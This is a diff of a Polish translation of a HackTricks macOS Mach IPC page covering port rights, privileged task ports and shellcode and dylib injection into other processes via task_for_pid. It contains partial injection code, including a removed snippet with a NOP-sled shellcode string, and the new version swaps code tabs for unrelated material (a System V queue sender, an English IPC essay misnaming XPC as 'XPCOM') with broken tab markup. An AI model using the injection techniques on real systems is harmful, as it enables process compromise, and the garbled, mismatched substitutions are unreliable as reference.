@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
 
 </details>
 
@@ -18,51 +18,64 @@ Inne sposoby wsparcia HackTricks:
 
 ### Podstawowe informacje
 
-Mach używa **zadań** jako **najmniejszej jednostki** do dzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane w stosunku 1:1 na procesy i wątki POSIX**.
+Mach używa **zadań** jako **najmniejszej jednostki** do dzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane 1:1 na procesy i wątki POSIX**.
 
-Komunikacja między zadaniami odbywa się za pomocą Mach Inter-Process Communication (IPC), wykorzystując jednokierunkowe kanały komunikacyjne. **Wiadomości są przesyłane między portami**, które działają jak **kolejki wiadomości** zarządzane przez jądro systemu.
+Komunikacja między zadaniami odbywa się za pomocą Mach Inter-Process Communication (IPC), wykorzystując jednokierunkowe kanały komunikacyjne. **Wiadomości są przesyłane między portami**, które działają jak **kolejki wiadomości** zarządzane przez jądro.
 
-Każdy proces ma **tabelę IPC**, w której można znaleźć **porty Mach procesu**. Nazwa portu Mach to właściwie liczba (wskaźnik do obiektu jądra).
+Każdy proces ma **tabelę IPC**, w której można znaleźć **porty mach procesu**. Nazwa portu mach to właściwie liczba (wskaźnik do obiektu jądra).
 
-Proces może również wysłać nazwę portu wraz z pewnymi uprawnieniami **do innego zadania**, a jądro spowoduje, że ta pozycja pojawi się w **tabeli IPC innego zadania**.
+Proces może również wysłać nazwę portu z pewnymi uprawnieniami **do innego zadania**, a jądro spowoduje, że ta pozycja pojawi się w **tabeli IPC innego zadania**.
 
-### Uprawnienia portu
+### Prawa portów
 
-Uprawnienia portu, które określają, jakie operacje może wykonywać zadanie, są kluczowe dla tej komunikacji. Możliwe **uprawnienia portu** to ([definicje stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
+Prawa portów, które określają, jakie operacje może wykonać zadanie, są kluczowe dla tej komunikacji. Możliwe **prawa portów** to ([definicje stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):
 
-* **Prawo odbioru**, które umożliwia odbieranie wiadomości wysłanych do portu. Porty Mach są kolejkami MPSC (wielu producentów, jeden konsument), co oznacza, że może być tylko **jedno prawo odbioru dla każdego portu** w całym systemie (w przeciwieństwie do potoków, gdzie wiele procesów może posiadać deskryptory plików do końca odczytu jednego potoku).
-* **Zadanie z prawem odbioru** może odbierać wiadomości i **tworzyć prawa wysyłania**, umożliwiając wysyłanie wiadomości. Początkowo tylko **własne zadanie ma prawo odbioru nad swoim portem**.
-* **Prawo wysyłania**, które umożliwia wysyłanie wiadomości do portu.
+* **Prawo odbierania**, które pozwala na odbieranie wiadomości wysłanych do portu. Porty Mach są kolejkami MPSC (wielu producentów, jeden konsument), co oznacza, że może istnieć tylko **jedno prawo odbierania dla każdego portu** w całym systemie (w przeciwieństwie do potoków, gdzie wiele procesów może trzymać deskryptory plików do końca odczytu jednego potoku).
+* **Zadanie z prawem odbierania** może odbierać wiadomości i **tworzyć prawa wysyłania**, umożliwiając wysyłanie wiadomości. Początkowo tylko **własne zadanie ma prawo odbierania nad swoim portem**.
+* **Prawo wysyłania**, które pozwala na wysyłanie wiadomości do portu.
 * Prawo wysyłania można **klonować**, więc zadanie posiadające prawo wysyłania może sklonować prawo i **przekazać je trzeciemu zadaniu**.
-* **Prawo wysłania raz**, które umożliwia wysłanie jednej wiadomości do portu, a następnie znika.
-* **Prawo zestawu portów**, które oznacza _zestaw portów_, a nie pojedynczy port. Usunięcie wiadomości z zestawu portów usuwa wiadomość z jednego z zawartych w nim portów. Zestawy portów mogą być używane do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w systemie Unix.
-* **Nazwa martwa**, która nie jest faktycznym prawem portu, ale jedynie zastępczym miejscem. Gdy port zostanie zniszczony, wszystkie istniejące prawa portu do portu zamieniają się w nazwy martwe.
+* **Prawo wysyłania raz**, które pozwala na wysłanie jednej wiadomości do portu, a następnie zniknie.
+* **Prawo zestawu portów**, które oznacza _zestaw portów_ zamiast pojedynczego portu. Usuwanie wiadomości z zestawu portów usuwa wiadomość z jednego z zawartych portów. Zestawy portów można używać do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unix.
+* **Nazwa martwa**, która nie jest faktycznym prawem portu, ale jedynie miejscem. Gdy port zostanie zniszczony, wszystkie istniejące prawa portów do portu zamieniają się w nazwy martwe.
 
-**Zadania mogą przekazywać prawa WYSYŁANIA innym**, umożliwiając im wysyłanie wiadomości z powrotem. **Prawa WYSYŁANIA mogą również być klonowane**, więc zadanie może zduplikować prawo i **przekazać je trzeciemu zadaniu**. To, w połączeniu z pośrednim procesem znanym jako **serwer rozruchowy**, umożliwia skuteczną komunikację między zadaniami.
+**Zadania mogą przekazywać prawa WYSYŁANIA innym**, umożliwiając im wysyłanie wiadomości z powrotem. **Prawa WYSYŁANIA można również klonować, więc zadanie może zduplikować i przekazać prawo trzeciemu zadaniu**. To, w połączeniu z pośrednim procesem znanym jako **serwer startowy**, umożliwia efektywną komunikację między zadaniami.
+
+### Porty plików
+
+Porty plików pozwalają na zamknięcie deskryptorów plików w portach Mac (za pomocą praw portów Mach). Możliwe jest utworzenie `fileport` z danego FD za pomocą `fileport_makeport` i utworzenie FD z fileport za pomocą `fileport_makefd`.
 
 ### Ustanowienie komunikacji
 
 #### Kroki:
 
-Jak już wspomniano, w celu ustanowienia kanału komunikacyjnego zaangażowany jest **serwer rozruchowy** (**launchd** w systemie Mac).
+Jak wspomniano, aby ustanowić kanał komunikacyjny, zaangażowany jest **serwer startowy** (**launchd** w systemie Mac).
 
-1. Zadanie **A** inicjuje **nowy port**, uzyskując **prawo ODBIORU** w procesie.
-2. Zadanie **A**, będąc posiadaczem prawa ODBIORU, **generuje prawo WYSYŁANIA dla portu**.
-3. Zadanie **A** nawiązuje **połączenie** z **serwerem rozruchowym**, dostarczając **nazwę usługi portu** i **prawo WYSYŁANIA** za pośrednictwem procedury znanej jako rejestracja rozruchowa.
-4. Zadanie **B** współdziała z **serwerem rozruchowym**, aby wykonać **wyszukiwanie rozruchowe dla usługi**. Jeśli operacja powiedzie się, **serwer duplikuje prawo WYSYŁANIA** otrzymane od zadania A i **przesyła je do zadania B**.
-5. Po uzyskaniu prawa WYSYŁANIA, zadanie **B** jest w stanie **sformułować** wiadomość i wysłać ją **do zadania A**.
-6. W przypadku komunikacji dwukierunkowej zazwyczaj zadanie **B** generuje nowy port z prawem **ODBIORU** i prawem **WYSYŁANIA**, a następnie przekazuje **prawo WYSYŁANIA do zadania A**, aby mogło wysyłać wiadomości do zadania B (komunikacja dwukierunkowa).
+1. Zadanie **A** inicjuje **nowy port**, uzyskując **prawo odbierania** w procesie.
+2. Zadanie **A**, będąc posiadaczem prawa odbierania, **generuje prawo wysyłania dla portu**.
+3. Zadanie **A** nawiązuje **połączenie** z **serwerem startowym**, dostarczając **nazwę usługi portu** i **prawo wysyłania** poprzez procedurę znana jako rejestracja startowa.
+4. Zadanie **B** współdziała z **serwerem startowym**, aby wykonać **wyszukiwanie startowe dla nazwy usługi**. W przypadku powodzenia **serwer duplikuje prawo wysyłania** otrzymane od zadania A i **przekazuje je zadaniu B**.
+5. Po uzyskaniu prawa wysyłania, zadanie **B** jest zdolne do **formułowania** wiadomości i wysyłania jej **do zadania A**.
+6. Dla komunikacji dwukierunkowej zazwyczaj zadanie **B** generuje nowy port z **prawem odbierania** i **prawem wysyłania**, a **prawo wysyłania przekazuje zadaniu A**, aby mogło wysyłać wiadomości do zadania B (komunikacja dwukierunkowa).
 
-Serwer rozruchowy **nie może uwierzytelnić** nazwy usługi zgłaszanej przez zadanie. Oznacza to, że **zadanie** potencjalnie może **udawać dowolne zadanie systemowe**, takie jak fałszywe **twierdzenie o nazwie usługi autoryzacji**, a następnie zatwierdzanie każdego żądania.
+Serwer startowy **nie może uwierzytelnić** nazwy usługi twierdzonej przez zadanie. Oznacza to, że **zadanie** potencjalnie **może podszywać się pod dowolne zadanie systemowe**, na przykład **fałszywie twierdząc, że jest nazwą usługi autoryzacji**, a następnie zatwierdzając każde żądanie.
 
-Następnie Apple przechowuje **nazwy usług dostarczanych przez system** w bezpiecznych plikach konfiguracyjnych, znajdujących się w chronionych katalogach SIP: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi przechowywany jest również **powiązany plik binarny**. Serwer rozruchowy tworzy i przechowuje **prawo ODBIORU dla każdej z tych nazw usług**.
+Następnie Apple przechowuje **nazwy usług dostarczanych przez system** w zabezpieczonych plikach konfiguracyjnych, znajdujących się w chronionych katalogach SIP: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi przechowywany jest również **powiązany plik binarny**. Serwer startowy utworzy i będzie posiadał **prawo odbierania dla każdej z tych nazw usług**.
 
-Dla tych predefiniowanych usług **proces wyszukiwania różni się nieco**. Podczas wyszukiwania nazwy usługi, launchd uruchamia usługę dynamicznie. Nowy proces wygląda następująco:
+Dla tych predefiniowanych usług, **proces wyszukiwania różni się nieco**. Gdy nazwa usługi jest wyszukiwana, launchd uruchamia usługę dynamicznie. Nowy schemat postępowania jest następujący:
 
-* Zadanie **B** inicjuje **wyszukiwanie rozruchowe** dla nazwy usługi.
-* **launchd** sprawdza, czy zadanie jest uruchomione, i jeśli nie, **uruchamia je**.
-* Zadanie **A** (usługa) wykonuje **rejestrację rozruchową**. Tutaj serwer rozruchowy tworzy prawo WYSYŁANIA, zatrzymuje je i **przekazuje prawo ODBIORU do zadania A**.
-* launchd duplikuje **prawo WYSYŁAN
+* Zadanie **B** inicjuje **wyszukiwanie startowe** dla nazwy usługi.
+* **launchd** sprawdza, czy zadanie jest uruchomione, i jeśli nie, **uruchamia** je.
+* Zadanie **A** (usługa) wykonuje **rejestrację startową**. Tutaj **serwer startowy** tworzy prawo wysyłania, zatrzymuje je i **przekazuje prawo odbierania zadaniu A**.
+* launchd duplikuje **prawo wysyłania i wysyła je do zadania B**.
+* Zadanie **B** generuje nowy port z **prawem odbierania** i **prawem wysyłania**, a **prawo wysyłania przekazuje zadaniu A** (usłudze), aby mogło wysyłać wiadomości do zadania B (komunikacja dwukierunkowa).
+
+Jednak ten proces dotyczy tylko predefiniowanych zadań systemowych. Zadania spoza systemu wciąż działają zgodnie z pierwotnym opisem, co potencjalnie może pozwolić na podszywanie się. 
+
+### Wiadomość Mach
+
+[Znajdź więcej informacji tutaj](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
+
+Funkcja `mach_msg`, będąca w zasadzie wywołaniem systemowym, jest wykorzystywana do wysyłania i odbierania wiadomości Mach. Funkcja wymaga, aby wiadomość była wysłana jako argument początkowy. Wiadomość ta musi rozpoczynać się od struktury `mach_msg_header_t`, a następnie zawierać rzeczywistą treść wiadomości. Struktura jest zdefiniowana następująco:
 ```c
 typedef struct {
 mach_msg_bits_t               msgh_bits;
@@ -73,30 +86,30 @@ mach_port_name_t              msgh_voucher_port;
 mach_msg_id_t                 msgh_id;
 } mach_msg_header_t;
 ```
-Procesy posiadające _**prawo odbioru**_ mogą otrzymywać wiadomości na porcie Mach. Z kolei **nadawcy** otrzymują _**prawo wysyłania**_ lub _**prawo wysłania jednorazowego**_. Prawo wysłania jednorazowego służy wyłącznie do wysłania jednej wiadomości, po czym staje się nieważne.
+Procesy posiadające _**prawo odbioru**_ mogą odbierać wiadomości na porcie Mach. Z kolei **nadawcy** otrzymują _**prawo wysyłania**_ lub _**prawo wysłania raz**_. Prawo wysłania raz służy wyłącznie do wysłania jednej wiadomości, po czym staje się nieważne.
 
-Aby osiągnąć łatwą **komunikację dwukierunkową**, proces może określić **port Mach** w nagłówku wiadomości Mach, zwany portem odpowiedzi (**`msgh_local_port`**), gdzie **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość. Bity flag w **`msgh_bits`** mogą być używane do **wskazania**, że dla tego portu należy utworzyć i przekazać **prawo wysłania jednorazowego** (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
+Aby osiągnąć łatwą **komunikację dwukierunkową**, proces może określić **port mach** w nagłówku mach **wiadomości** o nazwie _port odpowiedzi_ (**`msgh_local_port`**), gdzie **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość. Bity flag w **`msgh_bits`** mogą być używane do **wskazania**, że **prawo wysłania raz** powinno być wygenerowane i przesłane dla tego portu (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).
 
 {% hint style="success" %}
-Należy zauważyć, że tego rodzaju komunikacja dwukierunkowa jest używana w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ale **zazwyczaj tworzone są różne porty**, jak wyjaśniono wcześniej, aby utworzyć komunikację dwukierunkową.
+Zauważ, że tego rodzaju komunikacja dwukierunkowa jest używana w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ale **zazwyczaj tworzone są różne porty**, jak wyjaśniono wcześniej, aby stworzyć komunikację dwukierunkową.
 {% endhint %}
 
 Pozostałe pola nagłówka wiadomości to:
 
 * `msgh_size`: rozmiar całego pakietu.
 * `msgh_remote_port`: port, na który wysłana jest ta wiadomość.
-* `msgh_voucher_port`: [vouchery Mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
+* `msgh_voucher_port`: [vouchery mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
 * `msgh_id`: ID tej wiadomości, który jest interpretowany przez odbiorcę.
 
 {% hint style="danger" %}
-Należy zauważyć, że **wiadomości Mach są wysyłane przez** _**port Mach**_, który jest **kanałem komunikacji jednego odbiorcy** i **wielu nadawców**, wbudowanym w jądro Mach. **Wiele procesów** może **wysyłać wiadomości** do portu Mach, ale w dowolnym momencie tylko **jeden proces może z niego czytać**.
+Zauważ, że **wiadomości mach są wysyłane przez port mach**, który jest kanałem komunikacji **jednego odbiorcy** i **wielu nadawców** wbudowanym w jądro mach. **Wiele procesów** może **wysyłać wiadomości** do portu mach, ale w każdym momencie tylko **jeden proces może czytać** z niego.
 {% endhint %}
 
 ### Wyliczanie portów
 ```bash
 lsmp -p <pid>
 ```
-Możesz zainstalować ten narzędzie w systemie iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
+Możesz zainstalować to narzędzie w iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
 
 ### Przykład kodu
 
@@ -169,62 +182,61 @@ message.some_text[9] = 0;
 printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 }
 ```
-{% tab title="sender.c" %}
+{% endtab %}
+
+{% tab title="sender.c" %}Wysyłanie komunikatów IPC za pomocą kolejek komunikatów System V w systemie macOS.
+
+Aby wysłać komunikat IPC za pomocą kolejek komunikatów System V w systemie macOS, należy utworzyć kolejkę komunikatów, uzyskać dostęp do niej za pomocą klucza IPC, a następnie wysłać komunikat do kolejki.
+
+Oto przykładowy kod w języku C, który wysyła komunikat IPC za pomocą kolejek komunikatów System V w systemie macOS:
 
 ```c
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
 #include <sys/types.h>
 #include <sys/ipc.h>
 #include <sys/msg.h>
 
-#define MAX_TEXT 512
-
 struct msgbuf {
     long mtype;
-    char mtext[MAX_TEXT];
+    char mtext[100];
 };
 
 int main() {
+    key_t key;
     int msgid;
-    struct msgbuf msg;
+    struct msgbuf message;
 
-    // Create a message queue
-    msgid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
-    if (msgid == -1) {
-        perror("msgget");
-        exit(1);
-    }
+    key = ftok("sender.c", 'B');
+    msgid = msgget(key, 0666 | IPC_CREAT);
 
-    // Set the message type
-    msg.mtype = 1;
+    message.mtype = 1;
+    sprintf(message.mtext, "To jest przykładowy komunikat IPC.");
 
-    // Set the message text
-    strcpy(msg.mtext, "Hello, receiver!");
+    msgsnd(msgid, &message, sizeof(message), 0);
 
-    // Send the message
-    if (msgsnd(msgid, &msg, sizeof(msg.mtext), 0) == -1) {
-        perror("msgsnd");
-        exit(1);
-    }
-
-    printf("Message sent: %s\n", msg.mtext);
-
-    // Remove the message queue
-    if (msgctl(msgid, IPC_RMID, NULL) == -1) {
-        perror("msgctl");
-        exit(1);
-    }
+    printf("Wysłano komunikat IPC.\n");
 
     return 0;
 }
 ```
 
-{% endtab %}
+Ten kod tworzy kolejkę komunikatów, uzyskuje dostęp do niej za pomocą klucza IPC utworzonego na podstawie pliku `sender.c`, a następnie wysyła komunikat o typie 1 z określoną treścią do kolejki.
 
-{% tab title="receiver.c" %}
+Aby skompilować ten program, można użyć polecenia:
+
+```bash
+gcc sender.c -o sender
+```
+
+Następnie można uruchomić program za pomocą:
+
+```bash
+./sender
+```
+
+Upewnij się, że masz odpowiednie uprawnienia do korzystania z IPC w systemie macOS. Możesz również dostosować ten kod do swoich własnych potrzeb, zmieniając typ komunikatu i treść wysyłanego komunikatu. {% endtab %}
+```
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -276,23 +288,20 @@ return 1;
 printf("Sent a message\n");
 }
 ```
-{% endtab %}
-{% endtabs %}
+### Porty uprzywilejowane
 
-### Przywilejowane porty
-
-* **Port hosta**: Jeśli proces ma uprawnienie **Wysyłanie** na tym porcie, może uzyskać **informacje** o **systemie** (np. `host_processor_info`).
-* **Port hosta z uprawnieniem** `priv`: Proces z prawem **Wysyłanie** na tym porcie może wykonywać **uprzywilejowane działania**, takie jak ładowanie rozszerzenia jądra. **Proces musi być rootem**, aby uzyskać to uprawnienie.
-* Ponadto, aby wywołać API **`kext_request`**, potrzebne są inne uprawnienia **`com.apple.private.kext*`**, które są udzielane tylko binarnym plikom Apple.
-* **Port nazwy zadania**: Nieuprzywilejowana wersja portu zadania. Odwołuje się do zadania, ale nie pozwala na jego kontrolę. Jedyną dostępną przez niego rzeczą wydaje się być `task_info()`.
-* **Port zadania** (znany również jako port jądra): Posiadając uprawnienie Wysyłanie na tym porcie, można kontrolować zadanie (odczytywanie/zapisywanie pamięci, tworzenie wątków...).
-* Wywołaj `mach_task_self()` aby **uzyskać nazwę** dla tego portu dla zadania wywołującego. Ten port jest dziedziczony tylko podczas **`exec()`**; nowe zadanie utworzone za pomocą `fork()` otrzymuje nowy port zadania (jako szczególny przypadek, zadanie również otrzymuje nowy port zadania po `exec()` w binarnym pliku suid). Jedynym sposobem na uruchomienie zadania i uzyskanie jego portu jest wykonanie ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) podczas wykonywania `fork()`.
+* **Port hosta**: Jeśli proces ma uprawnienie **Wysyłanie** do tego portu, może uzyskać **informacje** o **systemie** (np. `host_processor_info`).
+* **Port uprzywilejowany hosta**: Proces z prawem **Wysyłanie** do tego portu może wykonywać **działania uprzywilejowane**, takie jak ładowanie rozszerzenia jądra. **Proces musi być rootem**, aby uzyskać to uprawnienie.
+* Ponadto, aby wywołać API **`kext_request`**, konieczne jest posiadanie innych uprawnień **`com.apple.private.kext*`**, które są udzielane tylko binariom Apple.
+* **Port nazwy zadania**: Nieuprzywilejowana wersja _portu zadania_. Odwołuje się do zadania, ale nie pozwala na jego kontrolę. Jedyną dostępną przez niego rzeczą wydaje się być `task_info()`.
+* **Port zadania** (znany również jako port jądra)**:** Posiadając uprawnienie Wysyłanie do tego portu, możliwe jest kontrolowanie zadania (odczytywanie/zapisywanie pamięci, tworzenie wątków...).
+* Wywołaj `mach_task_self()` aby **uzyskać nazwę** tego portu dla zadania wywołującego. Ten port jest dziedziczony tylko podczas **`exec()`**; nowe zadanie utworzone za pomocą `fork()` otrzymuje nowy port zadania (jako szczególny przypadek, zadanie również otrzymuje nowy port zadania po `exec()` w binarnym pliku suid). Jedynym sposobem na uruchomienie zadania i uzyskanie jego portu jest wykonanie ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) podczas `fork()`.
 * Oto ograniczenia dostępu do portu (z `macos_task_policy` z binarnego pliku `AppleMobileFileIntegrity`):
-* Jeśli aplikacja ma uprawnienie **`com.apple.security.get-task-allow`**, procesy **tej samej osoby mogą uzyskać dostęp do portu zadania** (zwykle dodawane przez Xcode do debugowania). Proces notaryzacji nie pozwoli na to w wersjach produkcyjnych.
-* Aplikacje z uprawnieniem **`com.apple.system-task-ports`** mogą uzyskać port zadania dla dowolnego procesu, z wyjątkiem jądra. W starszych wersjach nazywane to było **`task_for_pid-allow`**. Jest to przyznawane tylko aplikacjom Apple.
-* **Root może uzyskać dostęp do portów zadań** aplikacji **nie** skompilowanych z **utwardzonym** środowiskiem uruchomieniowym (i nie od Apple).
+* Jeśli aplikacja ma uprawnienie **`com.apple.security.get-task-allow`**, procesy z **tego samego użytkownika mogą uzyskać dostęp do portu zadania** (zazwyczaj dodawane przez Xcode do debugowania). Proces notaryzacji nie zezwoli na to w wersjach produkcyjnych.
+* Aplikacje z uprawnieniem **`com.apple.system-task-ports`** mogą uzyskać **port zadania dla dowolnego** procesu, z wyjątkiem jądra. W starszych wersjach nazywane to było **`task_for_pid-allow`**. Jest to udzielane tylko aplikacjom Apple.
+* **Root może uzyskać dostęp do portów zadań** aplikacji **nie** skompilowanych z **zabezpieczonym** czasem wykonania (i nie od Apple).
 
-### Wstrzykiwanie kodu Shell w wątek za pomocą portu zadania&#x20;
+### Wstrzykiwanie kodu shell w wątek za pomocą portu zadania
 
 Możesz pobrać kod shell z:
 
@@ -331,7 +340,33 @@ performMathOperations();  // Silent action
 return 0;
 }
 ```
-{% tab title="entitlements.plist" %}plik entitlements.plist
+{% endtab %}
+
+{% tab title="entitlements.plist" %} 
+
+### macOS IPC (Inter-Process Communication)
+
+Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other on macOS. There are various IPC mechanisms available on macOS, such as Mach ports, XPC services, and Distributed Objects. Understanding how these mechanisms work is crucial for both developers and security professionals.
+
+#### Mach Ports
+
+Mach ports are a fundamental IPC mechanism on macOS, allowing processes to send messages and data between each other. They are used by the system and applications for various purposes, such as inter-process communication and synchronization.
+
+#### XPC Services
+
+XPC (XPCOM) is a lightweight inter-process communication mechanism introduced in macOS. It allows processes to create and manage services that run in their own address space. XPC services are commonly used by applications to perform tasks in the background or handle privileged operations.
+
+#### Distributed Objects
+
+Distributed Objects is another IPC mechanism on macOS that allows objects to be passed between processes. It enables remote procedure calls and object serialization, making it easier for processes to interact with each other.
+
+Understanding how these IPC mechanisms work and their security implications is crucial for securing macOS systems and preventing privilege escalation attacks. Developers should follow best practices when implementing IPC in their applications to ensure data integrity and confidentiality.
+
+### References
+
+- [Apple Developer Documentation on Inter-Process Communication](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
+
+{% endtab %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -341,30 +376,14 @@ return 0;
 </dict>
 </plist>
 ```
-{% tabs %}
-{% tab title="Objective-C" %}
-```objective-c
-#import <Foundation/Foundation.h>
-#import <mach/mach.h>
-#import <mach/mach_vm.h>
-#import <sys/mman.h>
+{% endtab %}
+{% endtabs %}
 
-int main(int argc, const char * argv[]) {
-    @autoreleasepool {
-        if (argc != 2) {
-            printf("Usage: %s <PID>\n", argv[0]);
-            return 1;
-        }
-        
-        pid_t target_pid = atoi(argv[1]);
-        mach_port_t target_task;
-        kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
-        if (kr != KERN_SUCCESS) {
-            printf("Failed to get task for PID %d: %s\n", target_pid, mach_error_string(kr));
-            return 1;
-        }
-        
-        const char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
+**Skompiluj** poprzedni program i dodaj **uprawnienia** umożliwiające wstrzykiwanie kodu przez tego samego użytkownika (w przeciwnym razie będziesz musiał użyć **sudo**).
+
+<details>
+
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -568,13 +587,13 @@ gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ```
 ### Wstrzykiwanie dylib wątku za pomocą portu zadania
 
-W systemie macOS **wątki** mogą być manipulowane za pomocą **Mach** lub za pomocą **api `pthread` posix**. Wątek, który wygenerowaliśmy w poprzednim wstrzykiwaniu, został wygenerowany za pomocą api Mach, więc **nie jest zgodny z posix**.
+W systemie macOS **wątki** mogą być manipulowane za pomocą **Mach** lub za pomocą **api `pthread` posix**. Wątek wygenerowany w poprzednim wstrzyknięciu został wygenerowany za pomocą api Mach, więc **nie jest zgodny z posix**.
 
-Było możliwe **wstrzyknięcie prostego shellcode'u** w celu wykonania polecenia, ponieważ nie było konieczne korzystanie z api zgodnego z posix, tylko z Mach. **Bardziej złożone wstrzyknięcia** wymagałyby, aby **wątek** był również **zgodny z posix**.
+Było możliwe **wstrzyknięcie prostego shellcode'u** do wykonania polecenia, ponieważ **nie było konieczne korzystanie z api zgodnego z posix**, tylko z Mach. **Bardziej złożone wstrzyknięcia** wymagałyby, aby **wątek** był również **zgodny z posix**.
 
-Dlatego, aby **ulepszyć wątek**, powinien on wywołać **`pthread_create_from_mach_thread`**, co spowoduje **utworzenie prawidłowego wątku pthread**. Następnie, ten nowy wątek pthread może **wywołać dlopen**, aby **załadować dylib** z systemu, dzięki czemu zamiast pisania nowego shellcode'u do wykonywania różnych działań, można załadować niestandardowe biblioteki.
+Dlatego, aby **ulepszyć wątek**, należy wywołać **`pthread_create_from_mach_thread`**, który **utworzy prawidłowy wątek pthread**. Następnie ten nowy wątek pthread może **wywołać dlopen**, aby **załadować dylib** z systemu, więc zamiast pisać nowy shellcode do wykonania różnych działań, można załadować niestandardowe biblioteki.
 
-Można znaleźć **przykładowe dyliby** w (na przykład ten, który generuje logi, a następnie można ich słuchać):
+Możesz znaleźć **przykładowe dyliby** (na przykład taki, który generuje logi, które można później odczytać) w:
 
 {% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -782,7 +801,7 @@ return (-3);
 
 
 // Set the permissions on the allocated code memory
-```c
+```plaintext
 kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
 if (kr != KERN_SUCCESS)
@@ -791,7 +810,7 @@ fprintf(stderr,"Nie można ustawić uprawnień pamięci dla kodu zdalnego wątku
 return (-4);
 }
 
-// Ustawienie uprawnień dla przydzielonej pamięci stosu
+// Ustawienie uprawnień na przydzielonej pamięci stosu
 kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
 if (kr != KERN_SUCCESS)
@@ -801,14 +820,14 @@ return (-4);
 }
 
 
